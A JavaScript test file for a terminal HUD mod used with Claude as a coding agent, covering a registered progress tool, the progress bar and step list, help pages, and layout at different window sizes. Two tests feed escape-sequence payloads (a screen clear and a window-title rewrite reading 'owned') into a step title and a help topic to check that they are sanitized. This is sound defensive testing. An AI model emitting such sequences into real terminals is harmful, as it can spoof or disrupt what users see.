test('the bar and the badge round to bright blue on a sixteen colour terminal, not to white', async () => {
    expect(ansi16('#8f8cf4')).toBe(97);
    expect(ansi16(PLAN_ACCENT)).toBe(94);
    expect(ansi16(BADGE_BG)).toBe(94);
    expect(PLAN_ACCENT).toBe(BADGE_BG);
});

test('and it is still a blue, not a grey: blue is the strongest channel by a long way', async () => {
    const [r, g, b] = [1, 3, 5].map((i) => parseInt(PLAN_ACCENT.slice(i, i + 2), 16));
    expect(b - Math.max(r, g) > 100).toBe(true);
});

// ---- through the real hooks

async function barSession() {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    h.ctx.session.messages = async () => [];
    h.registered = [];
    h.ticks = [];
    h.invalidated = 0;
    h.ctx.tool = { register: async (def) => { h.registered.push(def); } };
    h.ctx.clock = { after: () => undefined, every: (ms, fn) => { h.ticks.push({ ms, fn }); } };
    h.ctx.ui.invalidate = () => { h.invalidated += 1; };
    await h.say('track on');
    await h.start();
    return h;
}

const write = (h, steps) => hookOf(h, 'tool.call', (m) => m && m.tool === HUD_TOOL)
    .handler(h.ctx, { tool: HUD_TOOL, steps }, async () => ({}));
const barRow = async (h) => find(await h.band('terminal'), 'hud-progress');

test('the mod registers a progress tool of its own, listed up front and not behind ToolSearch', async () => {
    const h = await barSession();
    expect(h.registered.length).toBe(1);
    const def = h.registered[0];
    expect(def.name).toBe(HUD_TOOL_NAME);
    expect(HUD_TOOL).toBe('mcp__hud__progress');
    expect(def.isDeferred).toBe(false);
    expect(def.inputSchema.required.includes('steps')).toBe(true);
    expect(def.inputSchema.properties.steps.items.properties.status.enum.join()).toBe('todo,doing,done');
    expect(def.description.includes('single small edit')).toBe(true);
});

test('the steps Claude reports are the bar: real counts, no tilde', async () => {
    const h = await barSession();
    const out = await write(h, [{ title: 'Read the code', status: 'done' }, { title: 'Write the fix', status: 'doing' }, { title: 'Run the tests', status: 'todo' }]);
    expect(out.result.startsWith('ok: 1/3')).toBe(true);
    const row = await barRow(h);
    expect(!!row).toBe(true);
    const text = textsOf(row);
    expect(text.includes('Tasks 1/3')).toBe(true);
    expect(text.includes('~')).toBe(false);
    expect(text.includes('Write the fix')).toBe(true);
});

test('the whole list is written each time, so the bar follows it step by step', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'doing' }, { title: 'b', status: 'todo' }, { title: 'c', status: 'todo' }]);
    expect(textsOf(await barRow(h)).includes('Tasks 0/3')).toBe(true);
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }, { title: 'c', status: 'todo' }]);
    expect(textsOf(await barRow(h)).includes('Tasks 1/3')).toBe(true);
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'done' }, { title: 'c', status: 'doing' }]);
    expect(textsOf(await barRow(h)).includes('Tasks 2/3')).toBe(true);
    // All done: a finished bar is a receipt and goes.
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'done' }, { title: 'c', status: 'done' }]);
    expect(!!(await barRow(h))).toBe(false);
});

test('one step is not a plan, and a subagent cannot write the main job\'s steps', async () => {
    const h = await barSession();
    const one = await write(h, [{ title: 'a', status: 'doing' }]);
    expect(one.result.startsWith('ignored')).toBe(true);
    expect(!!(await barRow(h))).toBe(false);
    const sub = await hookOf(h, 'tool.call', (m) => m && m.tool === HUD_TOOL)
        .handler(h.ctx, { tool: HUD_TOOL, agentId: 'a1', steps: [{ title: 'a', status: 'doing' }, { title: 'b', status: 'todo' }] }, async () => ({}));
    expect(sub.result.startsWith('ignored')).toBe(true);
    expect(!!(await barRow(h))).toBe(false);
});

test('a malformed call draws nothing and breaks nothing', async () => {
    const h = await barSession();
    for (const steps of [undefined, null, 'x', 5, [], [null, 3], [{ nope: 1 }, { nope: 2 }]]) {
        const out = await write(h, steps);
        expect(typeof out.result).toBe('string');
    }
    expect(!!(await barRow(h))).toBe(false);
});

test('the task tools and the hud tool feed the same bar, and /hud plan counts both', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'todo' }]);
    const text = (await h.say('plan')).text;
    expect(text.includes('progress 1')).toBe(true);
    expect(text.includes('plan: 1/2 done')).toBe(true);
});

test('a bar can be read back from the transcript after a restart', async () => {
    const found = replayPlan([
        { role: 'assistant', toolUses: [{ tool: HUD_TOOL, input: { steps: [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }, { title: 'c', status: 'todo' }] } }] },
        { role: 'assistant', toolUses: [{ tool: HUD_TOOL, input: { steps: [{ title: 'a', status: 'done' }, { title: 'b', status: 'done' }, { title: 'c', status: 'doing' }] } }] },
    ]);
    expect(found.source).toBe('todos');
    expect(found.counts.progress).toBe(2);
    const plan = progressOf(found.todos);
    expect(plan.done).toBe(2);
    expect(plan.doing).toBe(1);
});

test('the bar never asks a model for anything: it counts what was written and guesses nothing', async () => {
    const h = await barSession();
    let asked = 0;
    h.ctx.model = { complete: async () => { asked += 1; return { isAnswered: false, reason: 'x' }; } };
    await hookOf(h, 'prompt.compose').handler(h.ctx, { tools: ['Bash'] }, async () => ({ sections: [] }));
    const hook = callHook(h);
    for (let i = 0; i < 40; i += 1) await hook.handler(h.ctx, { tool: 'Bash', command: 'ls' }, ok());
    expect(asked).toBe(0);
    // No steps written, so no bar, however much work was done.
    expect(!!(await barRow(h))).toBe(false);
    expect((await h.say('estimate on')).text.includes('estimate')).toBe(false);
});

test('Claude working moves the bar, and the end of its turn stops it', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }, { title: 'c', status: 'todo' }]);
    const frame = h.ticks[0];
    expect(frame.ms <= 250).toBe(true);
    // A step was just reported, so Claude is at work: the bar is alive.
    await barRow(h);
    const working1 = h.invalidated;
    frame.fn(); frame.fn(); frame.fn();
    expect(h.invalidated).toBe(working1 + 3);
    // Its answer lands: the bar goes and the clock redraws nothing.
    await idle(h);
    const stillAt = h.invalidated;
    frame.fn(); frame.fn();
    expect(h.invalidated).toBe(stillAt);
    expect(!!(await barRow(h))).toBe(false);
    // Its next request: back, with the same counts.
    await working(h);
    const back = await barRow(h);
    expect(!!back).toBe(true);
    expect(textsOf(back).includes('Tasks 1/3')).toBe(true);
    const n = h.invalidated;
    frame.fn(); frame.fn();
    expect(h.invalidated).toBe(n + 2);
});

test('a bar left at 6 of 9 under a finished answer is not shown: it is hidden when Claude stops, and listed in /hud plan', async () => {
    const h = await barSession();
    const steps = [];
    for (let i = 0; i < 9; i += 1) steps.push({ title: 'step ' + i, status: i < 6 ? 'done' : 'todo' });
    await write(h, steps);
    expect(textsOf(await barRow(h)).includes('Tasks 6/9')).toBe(true);
    await idle(h);
    expect(!!(await barRow(h))).toBe(false);
    const text = (await h.say('plan')).text;
    expect(text.includes('Claude is idle')).toBe(true);
    expect(text.includes('[todo]  step 8')).toBe(true);
    expect(text.includes('plan: 6/9 done')).toBe(true);
});

test('a tool call from the main thread is Claude working, even if the prompt was never seen', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }]);
    await idle(h);
    expect(!!(await barRow(h))).toBe(false);
    // A queued message or a resumed turn: no prompt.submit, only work.
    await callHook(h).handler(h.ctx, { tool: 'Bash', command: 'ls' }, ok());
    expect(!!(await barRow(h))).toBe(true);
});

test('a subagent\'s tool calls do not make an idle main session look busy', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }]);
    await idle(h);
    await callHook(h).handler(h.ctx, { tool: 'Bash', command: 'ls', agentId: 'sub-1' }, ok());
    expect(!!(await barRow(h))).toBe(false);
});

test('an aborted turn stops the bar too', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }]);
    await hookOf(h, 'prompt.submit').handler(h.ctx, { text: 'go' }, h.next);
    await barRow(h);
    h.ctx.model = { complete: async () => ({ isAnswered: false, reason: 'x' }) };
    h.ctx.prompt = { submit: () => undefined };
    await hookOf(h, 'turn.complete').handler(h.ctx, { answer: '', isAborted: true, durationMs: 10 }, async () => ({ text: '' }));
    const n = h.invalidated;
    h.ticks[0].fn();
    expect(h.invalidated).toBe(n);
});

test('while Claude works the terminal bar differs from frame to frame', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'done' }, { title: 'c', status: 'doing' }, { title: 'd', status: 'todo' }]);
    const sig = async () => JSON.stringify(find(await h.band('terminal'), 'pg-bar'));
    const seen = new Set();
    for (let i = 0; i < 8; i += 1) { seen.add(await sig()); await sleep3(210); }
    expect(seen.size > 1).toBe(true);
    // And once it stops there is no bar to move.
    await idle(h);
    expect(await sig()).toBe('null');
});
const sleep3 = (ms) => new Promise((r) => setTimeout(r, ms));

test('steps are read whichever way their status is spelled', async () => {
    const steps = stepsFrom({ steps: [
        { title: 'a', status: 'done' }, { title: 'b', status: 'In Progress' }, { title: 'c', status: 'in-progress' },
        { title: 'd', status: 'in_progress' }, { title: 'e', status: 'Completed' }, { title: 'f', status: 'TODO' }, { title: 'g', status: 'pending' },
        { title: '', status: 'done' }, { title: 'h', status: 'nonsense' }, { title: 'i' },
    ] });
    expect(steps.map((s) => s.content).join('')).toBe('abcdefg');
    expect(steps.map((s) => s.status[0]).join('')).toBe('ciiicpp');
});

test('a step title is words only: control characters cannot reach the terminal, and it is capped', async () => {
    const esc = String.fromCharCode(27);
    const bell = String.fromCharCode(7);
    const steps = stepsFrom({ steps: [
        { title: 'Run' + esc + '[2J' + esc + ']0;owned' + bell + ' the tests', status: 'doing' },
        { title: 'x'.repeat(500), status: 'todo' },
    ] });
    expect(steps.length).toBe(2);
    expect(/[\u0000-\u001f\u007f-\u009f]/.test(steps[0].content)).toBe(false);
    expect(steps[0].content.startsWith('Run')).toBe(true);
    expect(steps[1].content.length).toBe(200);
});


// ---- /hud help

const everyHelpPage = () => [helpLines('').join('\n'), ...TOPICS.map((t) => helpLines(t).join('\n'))];

test('/hud help gives the whole guide, and the guide names every page', async () => {
    const h = await barSession();
    const text = (await h.say('help')).text;
    expect(text.startsWith('hud:')).toBe(true);
    for (const page of TOPICS) expect(text.includes(page)).toBe(true);
    expect(text.includes('WHAT YOU SEE')).toBe(true);
    expect(text.includes('COMMANDS')).toBe(true);
});

test('/hud help lists every command, and each one it lists is a verb the command answers', async () => {
    const guide = helpLines('').join('\n');
    for (const [verb] of COMMANDS) {
        expect(guide.includes('/hud ' + verb)).toBe(true);
        const first = verb.split(' ')[0];
        if (first) expect(VERBS.includes(first)).toBe(true);
    }
    // And the plain usage at the foot of /hud lists help too.
    const h = await barSession();
    expect((await h.say('')).text.includes('/hud help')).toBe(true);
});

test('every command a help page tells you to type exists', async () => {
    const seen = new Set();
    for (const page of everyHelpPage()) {
        for (const m of page.matchAll(/\/hud ([a-z]+)/g)) seen.add(m[1]);
    }
    expect(seen.size > 8).toBe(true);
    for (const verb of seen) expect(VERBS.includes(verb)).toBe(true);
});

test('every verb the help promises is answered by something other than the status screen', async () => {
    const h = await barSession();
    for (const verb of ['help', 'models', 'log', 'tune', 'plan', 'track', 'agents', 'suggest', 'know', 'blast', 'confirm', 'raw']) {
        const text = (await h.say(verb)).text;
        expect(typeof text).toBe('string');
        expect(text.startsWith('routing:')).toBe(false);
    }
});

test('/hud help <topic> gives one page, by its name or by a word people try', async () => {
    const h = await barSession();
    const bar = (await h.say('help bar')).text;
    expect(bar.startsWith('THE PROGRESS BAR')).toBe(true);
    expect(bar.includes('/hud plan')).toBe(true);
    expect(bar.includes('COMMANDS')).toBe(false);
    for (const word of ['progress', 'plan', 'tasks', 'tracking']) expect(topicFor(word)).toBe('bar');
    for (const word of ['blast', 'guard', 'destructive']) expect(topicFor(word)).toBe('safety');
    for (const word of ['pace', 'limits', 'confirm']) expect(topicFor(word)).toBe('quota');
    expect(topicFor('Routing!')).toBe('routing');
    expect(topicFor('')).toBe(null);
    expect((await h.say('help best')).text.startsWith('GETTING THE MOST')).toBe(true);
});

test('an unknown help topic points at the real ones and echoes nothing dangerous', async () => {
    const h = await barSession();
    const esc = String.fromCharCode(27);
    const text = (await h.say('help zzz' + esc + '[2Jqq')).text;
    expect(text.includes('No help page')).toBe(true);
    expect(text.includes('Pages: ')).toBe(true);
    expect(text.includes(esc)).toBe(false);
    for (const page of TOPICS) expect(text.includes(page)).toBe(true);
});

test('the help is words only: no em dashes, no control characters, and no line too wide to read', async () => {
    for (const page of everyHelpPage()) {
        expect(page.includes(String.fromCharCode(0x2014))).toBe(false);
        expect(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/.test(page)).toBe(false);
        for (const line of page.split('\n')) expect(line.length <= 125).toBe(true);
    }
});

test('asking for help changes nothing: routing, switches and the plan stay as they were', async () => {
    const h = await barSession();
    await write(h, [{ title: 'a', status: 'done' }, { title: 'b', status: 'doing' }]);
    const before = (await h.say('')).text;
    const plan = (await h.say('plan')).text;
    await h.say('help');
    await h.say('help tips');
    await h.say('help nonsense');
    expect((await h.say('')).text).toBe(before);
    expect((await h.say('plan')).text).toBe(plan);
});

test('the guide lists every verb the command answers, not just the ones in its own table', async () => {
    const guide = helpLines('').join('\n');
    for (const verb of VERBS) {
        if (verb === 'on' || verb === 'heads') continue;   // 'on' is the old name of 'auto', 'heads' of 'know'
        expect(guide.includes(verb === 'auto' ? '| auto' : '/hud ' + verb)).toBe(true);
    }
});

test('every page the guide and the pages point at exists', async () => {
    const pages = [helpLines('').join('\n'), ...TOPICS.map((t) => helpLines(t).join('\n'))];
    const named = new Set();
    for (const page of pages) {
        for (const m of page.matchAll(/\(help ([a-z]+)\)/g)) named.add(m[1]);
        for (const m of page.matchAll(/\/hud help ([a-z]+)/g)) named.add(m[1]);
    }
    expect(named.size > 4).toBe(true);
    for (const word of named) expect(topicFor(word) !== null).toBe(true);
});

test('every wording of the request asks Claude to make the list true before it stops', async () => {
    // The task tools offered: the reminder to finish is in the system prompt note.
    expect(trackingNudge(['Bash', 'TaskCreate', 'TaskUpdate']).includes('make the list true')).toBe(true);
    expect(trackingNudge(['Bash', 'TodoWrite']).includes('make the list true')).toBe(true);
    expect(trackingNudge(['Bash', 'ToolSearch']).includes('make the list true')).toBe(true);
    // The mid-job reminder says it too, whichever list it points at.
    expect(reminderText(['TaskCreate', 'TaskUpdate']).includes('before you stop')).toBe(true);
    expect(reminderText(['TodoWrite']).includes('before you stop')).toBe(true);
    expect(reminderText(['Bash']).includes('one last time before you stop')).toBe(true);
    // And the hud tool's own description, which is all Claude sees of it.
    const h = await barSession();
    expect(h.registered.some((t) => String(t.description).includes('one last time before you stop'))).toBe(true);
});


// ---- 0.15.0: the rail down the left, the full-width step, the steps around it

/** The band as the terminal asks for it, at a given window size. */
const bandAt = (h, columns, rows) => hookOf(h, 'ui.render', (m) => m && m.component === 'AbovePrompt')
    .handler(h.ctx, { surface: 'terminal', component: 'AbovePrompt', viewport: { columns, rows } }, async () => null);

const eightSteps = [
    { title: 'Explore the analytics codebase and its event collector', status: 'done' },
    { title: 'Map every tracking call the app makes today', status: 'done' },
    { title: 'Asking clarifying questions about the event schema, consent and retention rules', status: 'doing' },
    { title: 'Propose two or three integration approaches with their trade-offs', status: 'todo' },
    { title: 'Present the design section by section for your approval', status: 'todo' },
    { title: 'Write the design doc', status: 'todo' },
    { title: 'Self-review the spec', status: 'todo' },
    { title: 'Write the implementation plan', status: 'todo' },
];
const asItems = (steps) => stepsFrom({ steps });
const rowText = (pieces) => pieces.map((p) => p.text).join('');

test('the steps around the one in hand: the last finished, the next two, and a count of the rest', async () => {
    const rows = planListRows(asItems(eightSteps), { columns: 160, rows: 45 });
    expect(rows.length).toBe(4);
    expect(rowText(rows[0])).toBe('  ✓ Map every tracking call the app makes today');
    expect(rowText(rows[1]).includes('next  Propose two or three integration approaches')).toBe(true);
    expect(rowText(rows[2]).includes('then  Present the design section by section')).toBe(true);
    expect(rowText(rows[3])).toBe('    + 3 more after that');
    expect(rows[0][0].role).toBe('done');
});

test('a narrow pane keeps only the next step, and a short window keeps none', async () => {
    const narrow = planListRows(asItems(eightSteps), { columns: 88, rows: 45 });
    expect(narrow.length).toBe(2);
    expect(rowText(narrow[0]).includes('next  Propose')).toBe(true);
    expect(rowText(narrow[1])).toBe('    + 4 more after that');
    expect(planListRows(asItems(eightSteps), { columns: 160, rows: LIST_MIN_ROWS - 1 }).length).toBe(0);
    // A window that does not say how tall it is still gets the list.
    expect(planListRows(asItems(eightSteps), { columns: 160 }).length).toBe(4);
});

test('a title too long for the row is cut with an ellipsis, never wrapped', async () => {
    const long = eightSteps.map((s, i) => (i === 3 ? { ...s, title: 'x'.repeat(300) } : s));
    for (const columns of [40, 88, 160]) {
        for (const pieces of planListRows(asItems(long), { columns, rows: 45 })) {
            expect([...rowText(pieces)].length <= columns).toBe(true);
        }
    }
    const row = planListRows(asItems(long), { columns: 88, rows: 45 })[0];
    expect(rowText(row).endsWith('…')).toBe(true);
});

test('no list when there is nothing left to do, no plan, or nothing to show', async () => {
    expect(planListRows(asItems(eightSteps.map((s) => ({ ...s, status: 'done' }))), { columns: 160 }).length).toBe(0);
    expect(planListRows(asItems([eightSteps[0]]), { columns: 160 }).length).toBe(0);
    expect(planListRows(null, { columns: 160 }).length).toBe(0);
    // Two steps, the second in hand: nothing ahead, the last done is still worth a row.
    const two = planListRows(asItems([eightSteps[0], eightSteps[2]]), { columns: 160 });
    expect(two.length).toBe(1);
    expect(rowText(two[0]).includes('Explore the analytics codebase')).toBe(true);
});

test('with nothing marked in hand, every open step is ahead and none is singled out', async () => {
    const none = eightSteps.map((s) => (s.status === 'doing' ? { ...s, status: 'todo' } : s));
    const rows = planListRows(asItems(none), { columns: 160 });
    expect(rowText(rows[1]).includes('next  Asking clarifying questions')).toBe(true);
    expect(rowText(rows[rows.length - 1])).toBe('    + 4 more after that');
});

test('the list draws in plain characters for a terminal that is not in UTF-8', async () => {
    const rows = planListRows(asItems(eightSteps), { columns: 160, ascii: true });
    expect(rowText(rows[0]).startsWith('  v ')).toBe(true);
    expect(rowText(rows[1]).startsWith('  o ')).toBe(true);
});

test('every terminal row of the HUD sits inside the rail, the header included', async () => {
    const h = await barSession();
    await write(h, eightSteps);
    const tree = await bandAt(h, 160, 45);
    const rail = find(tree, 'hud-rail');
    expect(!!rail).toBe(true);
    const bar = find(rail, 'hud-rail-bar');
    expect(bar.position).toBe('absolute');
    expect(bar.top).toBe(0);
    expect(bar.bottom).toBe(0);
    expect(bar.overflow).toBe('hidden');
    expect(textsOf(bar).startsWith('▎\n▎')).toBe(true);
    // The header, the bar, the steps and the strip are all children of the rail.
    const keys = rail.children.map((c) => c && c.key);
    expect(keys.includes('hud-head')).toBe(true);
    expect(keys.includes('hud-progress')).toBe(true);
    expect(keys.includes('hud-list-0')).toBe(true);
    // The rows leave the rail and its gap free.
    expect(rail.paddingLeft).toBe(2);
});

test('the step in hand takes the width the bar does not need, so a long one is shown in full', async () => {
    const h = await barSession();
    await write(h, eightSteps);
    const row = find(await bandAt(h, 160, 45), 'hud-progress');
    const head = find(row, 'pg-head');
    expect(head.width > 81).toBe(true);
    const bar = textsOf(find(row, 'pg-bar'));
    expect([...bar.replace(/ \| /g, '')].length).toBe(40);
    // Narrow: the bar shrinks and the name still gets what is left.
    const small = find(await bandAt(h, 88, 45), 'hud-progress');
    const smallBar = [...textsOf(find(small, 'pg-bar')).replace(/ \| /g, '')].length;
    expect(smallBar).toBe(20);
    const pct = textsOf(find(small, 'pg-p'));
    expect(find(small, 'pg-head').width).toBe(88 - 2 - 20 - 'Tasks 2/8'.length - pct.length - 6);
});

test('the list shows under the bar while Claude works, and goes with it', async () => {
    const h = await barSession();
    await write(h, eightSteps);
    expect(hasKey(await bandAt(h, 160, 45), 'hud-list-3')).toBe(true);
    expect(hasKey(await bandAt(h, 160, 20), 'hud-list-0')).toBe(false);
    await idle(h);
    const after = await bandAt(h, 160, 45);
    expect(hasKey(after, 'hud-list-0')).toBe(false);
    expect(hasKey(after, 'hud-rail')).toBe(true);
});

test('the desktop draws no rail: it has a sidebar and gauges of its own', async () => {
    const h = await barSession();
    await write(h, eightSteps);
    const tree = await h.band('desktop');
    expect(hasKey(tree, 'hud-rail')).toBe(false);
    expect(hasKey(tree, 'hud-list-0')).toBe(false);
});

/**
 * The props a band's Box may carry, from the engine's own BoxProps. A tree
 * with any other is refused whole and the HUD vanishes: 0.15.0's first draft
 * did exactly that with borderTop, and passed every test here.
 */
const BOX_PROPS = new Set(['type', 'children', 'key', 'hover', 'position', 'top', 'left', 'right', 'bottom',
    'flexDirection', 'flexGrow', 'flexShrink', 'flexWrap', 'alignItems', 'alignSelf', 'justifyContent',
    'gap', 'columnGap', 'rowGap', 'width', 'height', 'minWidth', 'minHeight',
    'margin', 'marginX', 'marginY', 'marginTop', 'marginBottom', 'marginLeft', 'marginRight',
    'padding', 'paddingX', 'paddingY', 'paddingTop', 'paddingBottom', 'paddingLeft', 'paddingRight',
    'borderStyle', 'borderColor', 'borderDimColor', 'backgroundColor', 'overflow', 'display']);

test('every Box the band draws uses only props the engine accepts', async () => {
    const h = await barSession();
    await write(h, eightSteps);
    h.ctx.prompt = { submit: () => undefined };
    const trees = [await bandAt(h, 160, 45), await bandAt(h, 60, 20), await h.band('desktop')];
    await idle(h);
    trees.push(await bandAt(h, 160, 45));
    for (const tree of trees) {
        walk(tree, (n) => {
            if (n.type !== 'Box') return;
            for (const k of Object.keys(n)) {
                if (!BOX_PROPS.has(k)) throw new Error('Box ' + (n.key || '?') + ' has a prop the band refuses: ' + k);
            }
        });
    }
});
